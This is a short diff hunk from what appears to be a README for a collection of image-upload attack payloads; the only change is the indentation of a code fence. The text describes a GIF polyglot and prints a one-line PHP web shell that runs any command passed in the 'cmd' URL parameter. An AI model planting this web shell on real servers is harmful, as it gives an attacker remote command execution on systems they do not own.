@@ -68,6 +68,6 @@ This directory contains my payloads and scripts related to image upload vulnerab
    A GIF consisting of only the GIF89a + payload
    It contains the following PHP payload inside:
 
-   ```php
+  ```php
   <?php echo system($_GET['cmd']); ?> 
   
